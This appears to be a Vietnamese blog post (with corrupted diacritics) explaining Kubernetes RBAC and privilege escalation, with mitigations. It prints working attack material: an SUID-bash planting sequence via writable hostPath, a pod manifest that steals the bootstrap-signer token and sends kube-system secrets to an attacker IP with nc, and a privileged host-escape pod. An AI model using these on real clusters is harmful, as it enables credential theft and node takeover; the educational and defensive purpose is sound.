---
title: "Tu?n 2 - Hacking Kubernetes (Part 1)"
date: 2026-05-24 00:00:00 +0700
categories: ["Security Research"]
tags: ["Kubernetes", "Security"]
---


##  C�c Attack vector trong Privilege Escalation in K8s


Tru?c khi di sau v�o ki thu?t th� m�nh cung mu?n c�c b?n c� th? hi?u du?c c�c kh�i ni?m m� m�nh th?y l� quan tr?ng d? c� th? khai th�c c�c l? h?ng v? K8s.
### I. ServiceAccount l� g�?

Trong Kubernetes,�**ServiceAccount**�cung c?p d?nh danh cho c�c ti?n tr�nh ch?y b�n trong container . Khi ngu?i d�ng c? g?ng x�c th?c v?i v?i API K8s , ngu?i c� ch? c?n certificate d? x�c minh danh t�nh c?a h? . C�n v?i m?t non-human resource nhu pod th� c?n SA d? c� danh t�nh khi giao ti?p API server K8s . M?t ti?n tr�nh b�n trong Pod c� th? s? d?ng SA du?c li�n k?t v?i n� d? x�c th?c v?i API server.

![](/assets/images/posts/Pasted%20image%2020260524220427.png)


Trong Kubernetes, co ch? g�n ServiceAccount (SA) m?c d?nh ho?t d?ng nhu sau:

- **T? d?ng g�n:** M?i Namespace lu�n c� s?n m?t SA t�n l� `default`.
- **M?c d?nh:** N?u b?n kh�ng ch? d?nh `serviceAccountName` trong file c?u h�nh Pod, K8s s? t? d?ng g�n SA `default` n�y cho Pod d�.
- **G?n Token:** K8s s? t? d?ng mount m?t API token c?a SA n�y v�o thu m?c `/var/run/secrets/kubernetes.io/serviceaccount` b�n trong Pod.

V� d?:

`Pod -> d�ng ServiceAccount token -> g?i Kubernetes API Server`

M?c d?nh, Kubernetes thu?ng mount th�ng tin ServiceAccount v�o pod t?i:

`/var/run/secrets/kubernetes.io/serviceaccount/`

Trong thu m?c n�y thu?ng c�:

```
ca.crt      certificate d? verify API server
namespace  namespace hi?n t?i c?a pod
token      bearer token c?a ServiceAccount
```


### II. RBAC l� g�?
RBAC l� vi?t t?t c?a�**Role-Based Access Control**. N� quy?t d?nh m?t identity du?c ph�p l�m g� trong Kubernetes.

RBAC tr? l?i c�c c�u h?i ki?u:

ServiceAccount n�y c� du?c get secrets kh�ng? 
ServiceAccount n�y c� du?c list pods kh�ng? 
ServiceAccount n�y c� du?c create deployments kh�ng? 
ServiceAccount n�y c� du?c d?c secret trong namespace kh�c kh�ng?


![](/assets/images/posts/Pasted%20image%2020260524220317.png)


RBAC thu?ng g?m 4 object ch�nh:

`Role ,RoleBinding , ClusterRole, ClusterRoleBinding`

Trong K8s c�c th�nh ph?n n�y d�ng d? qu?n l� quy?n h?n c?a ngu?i d�ng v� ?ng d?ng v?i c�c t�i nguy�n trong Cluster

Hi?u 1 c�ch don gi?n th� Role/ClusterRole : D�ng cho c�u h?i du?c l�m g� ? (�?nh nghia quy?n) c�n binding th� tr? l?i cho c�u h?i ai du?c l�m (g�n quy?n cho 1 ngu?i d�ng c? th?)

Role/Rolebiding : D�ng khi b?n mu?n gi?i h?n quy?n d?nh ra trong 1 namespace nh?t d?nh

- Role : T?p h?p c�c quy t?c cho ph�p th?c hi?n 1 h�nh d?ng (get,list,create,delete) tr�n c�c t�i nguy�n nhu Pod, Service trong 1 namespace
- Rolebiding : Li�n k?t 1 role v?i 1 object c? th? nhu User , Group, ho?c Service Account) trong c�ng 1 namespace d� .
V� d? nhu : G�n quy?n "ch? xem Pod" cho b?n An trong namespace `frontend`

ClusterRole v� ClusterRoleBinding (C?p d? To�n C?m): D�ng cho c�c t�i nguy�n **kh�ng thu?c Namespace** (nhu Nodes, PersistentVolumes) ho?c khi mu?n c?p quy?n tr�n **to�n b? c�c Namespace**.

- **ClusterRole**: �?nh nghia quy?n tr�n to�n cluster. N� c� th? d�ng d? ph�n quy?n cho c�c t�i nguy�n chung c?a h? th?ng.
- **ClusterRoleBinding**: C?p quy?n t? ClusterRole cho ngu?i d�ng tr�n ph?m vi to�n c?m, b?t k? Namespace n�o.

C�c l?nh enum RBAC

```
# Get current privileges
kubectl auth can-i --list
# use `--as=system:serviceaccount:<namespace>:<sa_name>` to impersonate a service account

# List Cluster Roles
kubectl get clusterroles
kubectl describe clusterroles

# List Cluster Roles Bindings
kubectl get clusterrolebindings
kubectl describe clusterrolebindings

# List Roles
kubectl get roles
kubectl describe roles

# List Roles Bindings
kubectl get rolebindings
kubectl describe rolebindings
```


![](/assets/images/posts/Pasted%20image%2020260521224006.png)


M?t s? quy?n h?n nguy hi?m n?u config ko ch�nh x�c s? c� th? l� 1 attack surface cho c�c attacker khai th�c

1. Manipulate AuthN / AuthZ (Thao t�ng x�c th?c v� ?y quy?n)

Nh�m n�y cho ph�p k? t?n c�ng thay d?i c�ch h? th?ng nh?n di?n v� c?p quy?n:

- **impersonate**: Gi? danh ngu?i d�ng kh�c (c� th? l� admin).
- **escalate**: T? n�ng c?p quy?n h?n c?a ch�nh m�nh.
- **bind**: T?o c�c li�n k?t quy?n m?i d? c?p quy?n cho t�i kho?n kh�c.

2. Remote Code Execution (Th?c thi m� t? xa)

Nh�m n�y cho ph�p k? t?n c�ng ch?y l?nh tr�i ph�p b�n trong c�c container:

- **create pods/exec**: Ch?y l?nh tr?c ti?p v�o m?t Pod dang ho?t d?ng.
- **create nodes/proxy**: K?t n?i tr?c ti?p d?n c�c Node th�ng qua proxy d? can thi?p s�u hon.
- **control mutating webhooks**: Thay d?i c?u h�nh c?a c�c d?i tu?ng ngay khi ch�ng v?a du?c t?o ra.

3. Acquire Tokens (Chi?m do?t Token)

Nh�m n�y t?p trung v�o vi?c l?y c�c th�ng tin dang nh?p b� m?t:

- **list secrets**: �?c to�n b? m?t kh?u, API key luu trong cluster.
- **create serviceaccounts/token**: T? t?o token m?i cho c�c t�i kho?n d?ch v? d? duy tr� quy?n truy c?p b?n b?.

4. Steal Pods (��nh c?p ho?c can thi?p Pod)

Nh�m n�y nh?m v�o vi?c di?u hu?ng ho?c ph� h?y c�c ?ng d?ng dang ch?y:

- **modify nodes**: Thay d?i c?u h�nh m�y ch? d? �p Pod ch?y tr�n c�c n�t b? ki?m so�t.
- **delete pods/nodes**: G�y gi�n do?n d?ch v? b?ng c�ch x�a c�c th�nh ph?n quan tr?ng.



Du?i d�y l� 1 b�i t?p m� m�nh t�m du?c v? KillerConda d? c� th? demo c�ch config v? RBAC

![](/assets/images/posts/Pasted%20image%2020260521211943.png)



![](/assets/images/posts/Pasted%20image%2020260521212922.png)

C�u 1 : C�i n�y th� b?n t?o ra c�c resource c�ng v?i c�i verb th?c hi?n resource d� trong 1 namepace l� application

![](/assets/images/posts/Pasted%20image%2020260521213612.png)

C�u 2 : Sau khi t?o role th� b?n rolebinding g?n c�c quy?n v�o c�c role d�
![](/assets/images/posts/Pasted%20image%2020260521214129.png)


C�u 3 : Ki?m tra l?i c�c quy?n m� ta c� th? l�m
![](/assets/images/posts/Pasted%20image%2020260521215047.png)


## III . Nghi�n c?u c�c ki thu?t leo thang d?c quy?n trong K8s


### 1. Attacking Kubernetes from inside a Pod

![](/assets/images/posts/Pasted%20image%2020260522162103.png)

Khi attacker chi?m du?c shell trong 1 Pod , container d� tr? th�nh 1 ch? d?ng ? b�n trong K8s cluster . T? d�y m?c d�ch c?a c�c attacker l� tho�t kh?i Pod t? Node d� b?ng c�ch ki?m tra quy?n c?a Pod , t�m token , d� c�c service n?i b? , ki?m tra volume mount ,...

Pod escape : L� qu� tr�nh attacker tho�t kh?i ph?m vi container /Pod d? truy c?p v�o c�c Node . T?t nhi�n l� kh�ng ph?i Pod n�o cung escape du?c , t�y thu?c c�i c�ch Pod d� du?c config nhu Pod d� c� Privileged mode kh�ng , hostPath mount , hostPID, hostNetwork , Linux capabilities ho?c container runtime b? expose,...


��y l� v� d? di?n h�nh c?a misconfiguration trong Kubernetes. M?t c?u h�nh volume tu?ng nhu ph?c v? v?n h�nh c� th? tr? th�nh du?ng d?n d? attacker di t? container ra Node.

### a) Abusing  writeable hostPath/bind mounts (Container -> host root via SUID planting)


Tru?c khi di sau v�o ki thu?t t?n c�ng th� gi?i thi?u so qua v? kh�i ni?m hostPath

Trong Kubernetes, hostPath volume l� co ch? cho ph�p b?n g?n (mount) tr?c ti?p m?t t?p tin ho?c thu m?c t? h? th?ng t?p tin (filesystem) c?a m�y ch? (Worker Node) v�o b�n trong m?t Pod.

 �?c di?m c?t l�i

- **Luu tr? c?c b?:** D? li?u du?c luu th?ng tr�n ? c?ng c?a Node v?t l� (ho?c m�y ?o) dang ch?y Pod.
- **�? b?n (Persistence):** D? li?u kh�ng b? m?t khi container trong Pod b? kh?i d?ng l?i ho?c b? x�a.
- **T�nh r�ng bu?c (Node-specific):** V� g?n v?i m?t Node c? th?, n?u Pod b? t?t v� du?c l�n l?ch (schedule) l?i sang m?t Node kh�c, n� s? kh�ng th? truy c?p du?c d? li?u cu tr? khi Node m?i c� c?u tr�c thu m?c y h?t

Th�ng thu?ng , `hostPath` thu?ng du?c �p d?ng cho c�c tru?ng h?p d?c th� nhu:

- Ch?y c�c ?ng d?ng c?n d?c ho?c ghi v�o log h? th?ng c?a Node.
- C?n truy c?p c�c socket Docker daemon (v� d?: `/var/run/docker.sock`) t? b�n trong Pod.
- Th?c hi?n c�c t�c v? gi�m s�t (monitoring) ho?c qu?n l� cluster y�u c?u quy?n truy c?p s�u v�o filesystem c?a Node


N?u m?t Pod ho?c container b? compromise c� 1 volume ghi du?c �nh x? tr?c ti?p d?n host filesystem (K8s hostPath ho?c l� Docker bindmount ), v� b?n c� th? tr? th�nh root b�n trong container  , b?n c� th? t?n d?ng mount d� d? c� th? t?o ra 1 setuid-root binary tr�n host v� sau d� th?c thi  n� t? m�y ch? d? l?y quy?n root

Key conditions :

-  Volume mount t? host v�o container c� quy?n ghi
- Filesystem host kh�ng b?t co ch? ch?n ki?u `nosuid`.
- Attacker c� c�ch khi?n file du?c ghi tr�n host n?u file du?c th?c thi 


C�ch x�c d?nh hostPath/bind mounts c� th? du?c ghi 

- With kubectl , th� b?n c� check b?ng l?nh sau 
```
kubectl get pod -o jsonpath='{.specvolumes[*].hostPath.path}'
```

- T? b�n trong container , list mount v� t�m ki?m host-path mounts 

```
# Inside the compromised container
mount | column -t

cat /proc/self/mountinfo | grep -E 'host-path|kubernetes.io~host-path' || true

findmnt -T / 2>/dev/null | sed -n '1,200p'

# Test if a specific mount path is writable
TEST_DIR=/var/www/html/some-mount  # replace with your suspected mount path
[ -d "$TEST_DIR" ] && [ -w "$TEST_DIR" ] && echo "writable: $TEST_DIR"

# Quick practical test
printf "ping\n" > "$TEST_DIR/.w"

```

Plant a setuid root binary from the container:


```
# As root inside the container, copy a static shell (or /bin/bash) into the mounted path and set SUID/SGID

MOUNT="/var/www/html/survey"   # path inside the container that maps to a host directory

cp /bin/bash "$MOUNT/suidbash"
chmod 6777 "$MOUNT/suidbash"
ls -l "$MOUNT/suidbash"

# -rwsrwsrwx 1 root root 1234376 ... /var/www/html/survey/suidbash


```


```
# On the host, locate the mapped path (e.g., from the Pod spec .spec.volumes[].hostPath.path or by prior enumeration)
# Example host path: /opt/limesurvey/suidbash
ls -l /opt/limesurvey/suidbash
/opt/limesurvey/suidbash -p   # -p preserves effective UID 0 in bash

```


### Luu � khi khai th�c writable hostPath

K? thu?t writable hostPath kh�ng ph?i l�c n�o cung d?n t?i leo thang d?c quy?n ngay l?p t?c. M?t v� d? ph? bi?n l� attacker ghi m?t SUID binary v�o thu m?c du?c mount t? host. V? l� thuy?t, n?u binary n�y thu?c s? h?u c?a root v� c� SUID bit, khi du?c th?c thi tr�n host n� c� th? ch?y v?i effective UID l� root.

Tuy nhi�n, k? thu?t n�y ph? thu?c v�o mount option c?a filesystem. N?u filesystem tr�n host du?c mount v?i option `nosuid`, Linux s? b? qua SUID/SGID bit. Khi d�, m?c d� file hi?n th? c� quy?n SUID, n� cung kh�ng th? du?c d�ng d? n�ng quy?n. B?n c� th? check mount option tr�n host b?ng (cat /proc/mounts | grep�) and  ki?m nosuid.

Ngo�i ra, attacker c?n c� c�ch d? khi?n file d� ghi du?c th?c thi t? ph�a host. N?u ch? c� quy?n ghi t? container nhung kh�ng c� user shell, cron job, systemd service ho?c process n�o tr�n host ch?y file d�, th� vi?c �plant� SUID binary ch? d?ng l?i ? vi?c d?t file l�n host filesystem, chua d? d? chi?m quy?n.

Tuy nhi�n, writable hostPath v?n l� m?t r?i ro nghi�m tr?ng n?u du?ng d?n du?c mount l� thu m?c nh?y c?m. V� d?, n?u mount tr? t?i `/root/.ssh`, attacker c� th? ghi th�m SSH key; n?u mount tr? t?i `/etc/cron.d`, attacker c� th? t?o cron job; n?u mount tr? t?i `/etc/systemd/system`, attacker c� th? d?t service persistence. V� v?y, m?c d? nguy hi?m c?a writable hostPath ph? thu?c r?t l?n v�o host path c? th? du?c mount v�o Pod.

 K? thu?t n�y cung ho?t d?ng v?i c�c bind mount th�ng thu?ng c?a Docker; trong Kubernetes, n� thu?ng l� m?t volume hostPath (readOnly: false) ho?c m?t subPath c� ph?m vi kh�ng ch�nh x�c.


### b) Abusing Roles/ClusterRoles in Kubernetes

Nhu trong ph?n ServiceAccount m�nh c� vi?t ? tr�n th� da s? c�c Pod ch?y v?i service account token trong n� . ��i khi SA n�y du?c c?u h�nh ko d�ng n�n ch�ng ta thu?ng s? t?n d?ng t?n d?ng SA c� 1 s? d?c quy?n n�y d? c� th? khai th�c 

![](/assets/images/posts/Pasted%20image%2020260522174411.png)


Privilege Escalation trong Kubernetes c� th? hi?u l� qu� tr�nh attacker t�m c�ch chuy?n t? quy?n hi?n t?i sang m?t identity kh�c c� quy?n cao hon. Identity n�y c� th? l� user, group, ServiceAccount trong cluster, ho?c trong m?t s? tru?ng h?p l� quy?n cloud IAM b�n ngo�i n?u cluster ch?y tr�n AWS, GCP ho?c Azure.

Kh�c v?i privilege escalation tr�n Linux truy?n th?ng, trong Kubernetes attacker kh�ng ch? c? g?ng leo t? user thu?ng l�n root trong m?t m�y. M?c ti�u c� th? l� chi?m du?c ServiceAccount m?nh hon, d?c du?c Secret nh?y c?m, t?o Pod v?i c?u h�nh nguy hi?m, truy c?p Node, ho?c l?i d?ng quy?n cloud g?n v?i workload ho?c node.

Trong Kubernetes, c� b?n hu?ng leo thang d?c quy?n ph? bi?n:

1. **Impersonation**  
   Attacker c� quy?n gi? m?o user, group ho?c ServiceAccount kh�c. N?u identity b? impersonate c� quy?n cao hon, attacker c� th? h�nh d?ng v?i quy?n c?a identity d�.

2. **Create / Patch / Exec Pod**  
   Attacker c� quy?n t?o, s?a ho?c exec v�o Pod. N?u c� th? t?o Pod d�ng ServiceAccount m?nh hon, mount secret, ho?c ch?y Pod v?i c?u h�nh privileged, attacker c� th? m? r?ng quy?n trong cluster.

3. **Read Secrets**  
   Kubernetes Secret c� th? ch?a ServiceAccount token, password, kubeconfig ho?c credential ?ng d?ng. N?u attacker c� quy?n `get` ho?c `list` Secret, h? c� th? l?y credential d? impersonate identity kh�c.

4. **Escape t? container ra Node**  
   N?u Pod du?c c?u h�nh qu� nguy hi?m, v� d? privileged, hostPID, hostNetwork ho?c mount hostPath, attacker c� th? tho�t kh?i container d? truy c?p Node. Khi d� v�o Node, attacker c� th? t�m token c?a c�c Pod kh�c, kubelet credential ho?c cloud metadata credential.

Ngo�i b?n hu?ng ch�nh tr�n, m?t quy?n d�ng ch� � kh�c l� `port-forward`. N?u attacker c� quy?n port-forward t?i Pod, h? c� th? truy c?p c�c service n?i b? v?n kh�ng du?c expose ra ngo�i.


### Wildcard Permission: quy?n qu� r?ng trong RBAC

Trong RBAC, wildcard `*` l� m?t c?u h�nh r?t nguy hi?m n?u du?c c?p sai d?i tu?ng. Wildcard c� th? xu?t hi?n ? `apiGroups`, `resources` ho?c `verbs`.

V� d?:

```
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata:
  name: api-resource-verbs-all
rules:
rules:
- apiGroups: ["*"]
  resources: ["*"]
  verbs: ["*"]

```


C?u h�nh n�y c� nghia l� identity du?c c?p quy?n c� th? th?c hi?n m?i h�nh d?ng tr�n m?i lo?i t�i nguy�n thu?c m?i API group. N?u quy?n n�y n?m trong�ClusterRole, ph?m vi ?nh hu?ng kh�ng ch? gi?i h?n trong m?t namespace m� c� th? �p d?ng tr�n to�n cluster.

��y thu?ng l� quy?n d�nh cho admin ho?c controller h? th?ng c� nhu c?u d?c bi?t. N?u m?t ServiceAccount c?a workload th�ng thu?ng du?c g�n quy?n wildcard, attacker ch? c?n compromise Pod s? d?ng ServiceAccount d� l� c� th? c� g?n nhu to�n quy?n thao t�c v?i cluster.


M?t bi?n th? kh�c l� wildcard resource nhung gi?i h?n verb:

```
apiGroups: ["*"]
resources: ["*"]
verbs: ["create", "list", "get"]
```


Nh�n qua c� v? �t nguy hi?m hon�verbs: ["*"], nhung v?n t?o ra r?i ro l?n:

- create: c� th? t?o t�i nguy�n m?i, bao g?m Pod ho?c RoleBinding n?u kh�ng b? gi?i h?n.
- list: c� th? li?t k� t�i nguy�n trong cluster, l�m l? c?u tr�c h? th?ng.
- get: c� th? d?c t�i nguy�n nh?y c?m, d?c bi?t l� Secret.

V� v?y, khi d�nh gi� RBAC, kh�ng ch? c?n t�m quy?n�*, m� c�n c?n xem quy?n d� �p d?ng l�n resource n�o v� ? ph?m vi namespace hay cluster.


### Pod Create - Steal Token 

M?t quy?n tu?ng nhu b�nh thu?ng nhung r?t nguy hi?m trong Kubernetes l� `create pods`. N?u attacker c� quy?n t?o Pod trong m?t namespace, h? c� th? c? g?ng t?o Pod m?i s? d?ng m?t ServiceAccount kh�c trong c�ng namespace.

N?u ServiceAccount d� c� quy?n cao hon, token c?a n� s? du?c mount v�o Pod m?i. Khi attacker di?u khi?n container trong Pod n�y, h? c� th? d?c token v� d�ng n� d? g?i Kubernetes API v?i quy?n c?a ServiceAccount m?nh hon.


V� d? v? m?t pod s? d�nh c?p token c?a�`bootstrap-signer`t�i kho?n d?ch v? v� g?i n� cho k? t?n c�ng:

```
apiVersion: v1
kind: Pod
metadata:
  name: alpine
  namespace: kube-system
spec:
  containers:
    - name: alpine
      image: alpine
      command: ["/bin/sh"]
      args:
        [
          "-c",
          'apk update && apk add curl --no-cache; cat /run/secrets/kubernetes.io/serviceaccount/token | { read TOKEN; curl -k -v -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" https://192.168.154.228:8443/api/v1/namespaces/kube-system/secrets; } | nc -nv 192.168.154.228 6666; sleep 100000',
        ]
  serviceAccountName: bootstrap-signer
  automountServiceAccountToken: true
  hostNetwork: true

```

N�i don gi?n: n?u attacker c� quy?n�**t?o Pod trong namespace�kube-system**, attacker c� th? t?o m?t Pod m?i v� b?t Pod d� ch?y b?ng ServiceAccount t�n�bootstrap-signer. Khi Pod ch?y, Kubernetes s? t? mount token c?a ServiceAccount d� v�o trong container. Sau d� command b�n trong container d?c token n�y v� d�ng n� d? g?i API Server.

 Gi?i th�ch t?ng ph?n

`metadata: name: alpine namespace: kube-system`

T?o Pod t�n�alpine�trong namespace�kube-system.

Namespace n�y nh?y c?m v� thu?ng ch?a c�c component h? th?ng ho?c ServiceAccount quan tr?ng.

```
image: alpine 
command: ["/bin/sh"]
```

Pod d�ng image Alpine v� ch?y shell.

```
serviceAccountName: bootstrap-signer
automountServiceAccountToken: true
```

��y l� ph?n quan tr?ng nh?t.

N� b?o Kubernetes ch?y Pod n�y v?i ServiceAccount�bootstrap-signer.

Khi�automountServiceAccountToken: true, token c?a ServiceAccount d� s? du?c mount v�o container t?i:

`/run/secrets/kubernetes.io/serviceaccount/token`

T?c l� b�n trong container c� th? d?c du?c token n�y.

`cat /run/secrets/kubernetes.io/serviceaccount/token`

L?nh n�y d?c token c?a ServiceAccount�bootstrap-signer.

```
curl -k -v \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  https://192.168.154.228:8443/api/v1/namespaces/kube-system/secrets
```

L?nh n�y d�ng token v?a d?c d? g?i Kubernetes API.

C? th? n� dang th? truy c?p endpoint li?t k� Secret trong namespace�kube-system.

N?u ServiceAccount�bootstrap-signer�c� quy?n d?c Secret, API Server s? tr? v? d? li?u Secret.

`| nc -nv 192.168.154.228 6666`

Ph?n n�y g?i output ra m�y attacker ? IP�192.168.154.228, port�6666.

N�i c�ch kh�c:

`�?c token -> d�ng token g?i API -> g?i k?t qu? v? attacker`

`hostNetwork: true`

Pod d�ng network namespace c?a Node.

�i?u n�y c� th? gi�p Pod truy c?p network gi?ng nhu Node, d�i khi bypass m?t s? gi?i h?n network ho?c truy c?p du?c endpoint m� Pod thu?ng kh�ng truy c?p du?c.


�i?m quan tr?ng ? d�y l� attacker kh�ng c?n bi?t password hay private key c?a ServiceAccount. Kubernetes t? d?ng mount token v�o Pod n?u�automountServiceAccountToken�du?c b?t.

### �i?u ki?n c?n c�

- Attacker c� quy?n�create pods.
- Namespace t?n t?i ServiceAccount c� quy?n cao hon.
- Admission policy kh�ng ch?n vi?c g?n ServiceAccount d�.
- Token du?c mount v�o Pod.

### Ph�ng th?

- Kh�ng c?p quy?n�create pods�qu� r?ng.
- Kh�ng d? ServiceAccount m?nh n?m trong namespace c� workload k�m tin c?y.
- T?t�automountServiceAccountToken�n?u Pod kh�ng c?n g?i Kubernetes API.
- D�ng RBAC least privilege.
- D�ng admission controller nhu Kyverno, OPA Gatekeeper ho?c Pod Security Admission d? ki?m so�t ServiceAccount du?c ph�p s? d?ng.


## Pod Create & Escape



N?u attacker c� quy?n t?o Pod v� cluster kh�ng c� ch�nh s�ch Pod Security ch?t ch?, h? c� th? t?o m?t Pod v?i c?u h�nh nguy hi?m d? ti?p c?n Node.

M?t s? c?u h�nh d?c bi?t nguy hi?m g?m:

| C?u h�nh | � nghia | R?i ro |
|---|---|---|
| `privileged: true` | Container du?c c?p quy?n g?n nhu tuong duong host | C� th? tuong t�c s�u v?i kernel, device, container runtime |
| `hostPID: true` | Pod d�ng PID namespace c?a host | C� th? nh�n th?y process tr�n Node |
| `hostNetwork: true` | Pod d�ng network namespace c?a host | C� th? truy c?p network nhu Node, ?nh hu?ng NetworkPolicy |
| `hostIPC: true` | Pod d�ng IPC namespace c?a host | C� th? truy c?p shared memory ho?c IPC resource |
| `hostPath: /` | Mount filesystem g?c c?a Node v�o container | C� th? d?c/s?a file tr�n Node n?u c� quy?n |

N?u nhi?u c?u h�nh nguy hi?m du?c k?t h?p, Pod c� th? tr? th�nh c?u n?i d? attacker escape ra Node.

```
apiVersion: v1
kind: Pod
metadata:
  name: ubuntu
  labels:
    app: ubuntu
spec:
  # Uncomment and specify a specific node you want to debug
  # nodeName: <insert-node-name-here>
  containers:
    - image: ubuntu
      command:
        - "sleep"
        - "3600" # adjust this as needed -- use only as long as you need
      imagePullPolicy: IfNotPresent
      name: ubuntu
      securityContext:
        allowPrivilegeEscalation: true
        privileged: true
        #capabilities:
        #  add: ["NET_ADMIN", "SYS_ADMIN"] # add the capabilities you need https://man7.org/linux/man-pages/man7/capabilities.7.html
        runAsUser: 0 # run as root (or any other user)
      volumeMounts:
        - mountPath: /host
          name: host-volume
  restartPolicy: Never # we want to be intentional about running this pod
  hostIPC: true # Use the host's ipc namespace https://www.man7.org/linux/man-pages/man7/ipc_namespaces.7.html
  hostNetwork: true # Use the host's network namespace https://www.man7.org/linux/man-pages/man7/network_namespaces.7.html
  hostPID: true # Use the host's pid namespace https://man7.org/linux/man-pages/man7/pid_namespaces.7.htmlpe_
  volumes:
    - name: host-volume
      hostPath:
        path: /

```


## Gi?i th�ch t?ng ph?n

```
`apiVersion: v1 
kind: Pod 
metadata: 
name: ubuntu`
```

T?o m?t Pod t�n�ubuntu.

`containers: - image: ubuntu command: - "sleep" - "3600"`

Container d�ng image Ubuntu v� ch? ch?y�sleep 3600�d? gi? Pod s?ng trong 1 gi?. Sau khi Pod ch?y, attacker c� th?�exec�v�o container d? thao t�c th? c�ng.

```
securityContext:
  allowPrivilegeEscalation: true
  privileged: true
  runAsUser: 0
```

��y l� ph?n r?t nguy hi?m.

- runAsUser: 0: container ch?y b?ng user root.
- allowPrivilegeEscalation: true: cho ph�p process trong container leo quy?n th�ng qua co ch? nhu SUID ho?c file capability.
- privileged: true: container du?c c?p quy?n r?t cao, g?n v?i quy?n c?a host. Nhi?u l?p c� l?p b?o m?t c?a container b? n?i l?ng.

N�i ng?n g?n: container n�y kh�ng c�n l� workload b�nh thu?ng n?a, m� l� m?t container c� quy?n h? th?ng r?t m?nh.

```
volumeMounts:
  - mountPath: /host
    name: host-volume
```

Mount m?t volume v�o trong container t?i du?ng d?n�/host.

Ph?n volume du?c d?nh nghia b�n du?i:

```
volumes:
  - name: host-volume
    hostPath:
      path: /
```

hostPath.path: /�nghia l� mount to�n b? filesystem g?c c?a Node v�o container.

T?c l�:

`Trong container: /host ,Th?c t? l�: / c?a Node`

V� v?y, khi attacker v�o container v� d?c�/host/etc, th?c ch?t l� dang d?c�/etc�c?a Node.

V� d?:

`/host/etc/kubernetes/ /host/var/lib/kubelet/ /host/root/ /host/home/`

��y l� m?t trong nh?ng c?u h�nh hostPath nguy hi?m nh?t.

`hostIPC: true`

Container d�ng IPC namespace c?a host.

IPC l� co ch? giao ti?p gi?a c�c process nhu shared memory, semaphore, message queue. N?u d�ng IPC namespace c?a host, container c� th? nh�n th?y ho?c tuong t�c v?i m?t s? IPC resource c?a Node.

`hostNetwork: true`

Container d�ng network namespace c?a host.

�i?u n�y c� nghia l� Pod d�ng network stack c?a Node, kh�ng ph?i network ri�ng c?a Pod. N� c� th?:

- Nh�n network t? g�c nh�n c?a Node.
- Truy c?p c�c service ch? bind tr�n Node network.
- C� kh? nang bypass m?t s? NetworkPolicy t�y CNI.
- Truy c?p metadata endpoint trong m�i tru?ng cloud d? hon.

`hostPID: true`

Container d�ng PID namespace c?a host.

�i?u n�y cho ph�p container nh�n th?y process dang ch?y tr�n Node. N?u k?t h?p v?i�privileged: true, attacker c� th? d�ng k? thu?t nhu�nsenter�d? v�o namespace c?a process tr�n host, thu?ng l� PID 1.

N�i d? hi?u:

`hostPID: true -> th?y process c?a Node privileged: true -> c� quy?n tuong t�c s�u hostPath: / -> th?y filesystem c?a Node`

Khi 3 th? n�y k?t h?p l?i, ranh gi?i container v� host g?n nhu b? ph� v?.

## Flow t?n c�ng

```
Attacker c� quy?n create pods
        |
        v
T?o Pod ubuntu v?i privileged + hostPID + hostNetwork + hostPath /
        |
        v
Exec v�o container
        |
        v
Truy c?p /host d? d?c filesystem c?a Node
        |
        v
T�m kubelet config, kubeconfig, token, secret, certificate
        |
        v
C� th? leo thang ra Node ho?c cluster
```

## V� sao n� nguy hi?m?

V� Pod n�y c� qu� nhi?u d?c quy?n c�ng l�c:

|C?u h�nh|Nguy hi?m ? d�u|
|---|---|
|privileged: true|Container c� quy?n r?t cao tr�n host|
|runAsUser: 0|Ch?y b?ng root trong container|
|allowPrivilegeEscalation: true|Cho ph�p leo quy?n trong container|
|hostPath: /|Mount to�n b? filesystem c?a Node|
|hostPID: true|Nh�n th?y process c?a Node|
|hostNetwork: true|D�ng network c?a Node|
|hostIPC: true|D�ng IPC c?a Node|

N?u cluster kh�ng c� Pod Security Admission, Kyverno, Gatekeeper ho?c policy tuong duong d? ch?n c�c c?u h�nh n�y, quy?n�create pods�c� th? tr? th�nh du?ng d?n leo thang r?t m?nh.


### Stealth / BadPods

### C�c bi?n th? Pod nguy hi?m

Kh�ng ph?i l�c n�o attacker cung c?n t?o m?t Pod b?t t?t c? quy?n nguy hi?m. Trong th?c t?, m?i c?u h�nh c� th? t?o ra m?t m?c d? r?i ro kh�c nhau.

M?t s? bi?n th? thu?ng du?c nghi�n c?u trong BadPods:

- **Privileged + hostPID**: r?t nguy hi?m v� container c� quy?n cao v� nh�n th?y process c?a host.
- **Privileged only**: c� th? tuong t�c s�u v?i h? th?ng, ph? thu?c runtime v� kernel.
- **hostPath**: nguy hi?m n?u mount thu m?c nh?y c?m c?a Node.
- **hostPID**: c� th? quan s�t process tr�n host, t�m th�ng tin nh?y c?m trong command line.
- **hostNetwork**: c� th? truy c?p network t? g�c nh�n c?a Node.
- **hostIPC**: c� th? ?nh hu?ng ho?c d?c IPC/shared memory trong m?t s? tru?ng h?p.

� nghia c?a ph?n n�y l�: Kubernetes privilege escalation kh�ng ch? d?n t? m?t c?u h�nh duy nh?t, m� thu?ng l� k?t qu? c?a nhi?u c?u h�nh y?u k?t h?p v?i nhau.

B?n c� th? tham kh?o v� d? c�ch t?o c?u h�nh badpods t?i link n�y kh� l� hay ? d�y.

https://github.com/BishopFox/badPods

Ngo�i ra tui cung c� nghi�n c?u 1 case kh� l� hay tr�n X c?a Duffie Cooley minh h?a m?t one-liner t?o Pod d?c quy?n d? truy c?p namespace c?a Node. T?n d?ng 2 c?u h�nh l�  b?t `hostPID: true` v� `privileged: true` https://x.com/mauilion/status/1129468485480751104



### Container escape

M?t trong nh?ng r?i ro nghi�m tr?ng nh?t khi v?n h�nh kubernetes l� container breakout , l�  t�nh hu?ng m� m?t ti?n tr�nh ch?y trong container c� quy?n tho�t ra co ch? c� l?p hi?n t?i c?a container v� t�c d?ng l�n host v� node cung nhu c�c t�i nguy�n kh�c trong cluster.

V?  l� thuy?t ,container breakout thu?ng du?c hi?u l� khai th�c l? h?ng ph�a kernel ,container runtime ,network stack ho?c storage stack d? ph� v? co ch? isolation . Tuy nhi�n trong th?c t? , kh�ng ph?i l�c n�o attacker cung ph?i t?n c�ng b?ng c�c l?i Zero day ph?c t?p ,nhung b?n c� th? tham kh?o c�c CVE 2026 v? linux kernel nhu : Copy-fail , DirtyFrag, DirtyDecrypt,... .Nhi?u tru?ng h?p breakout v?n x?y ra do misconfig , v� d? container ch?y v?i quy?n qu� cao ,mount file system c?a host ,c?p th?a linux capabilities, ho?c ServiceAccount c� RBAC qu� r?ng

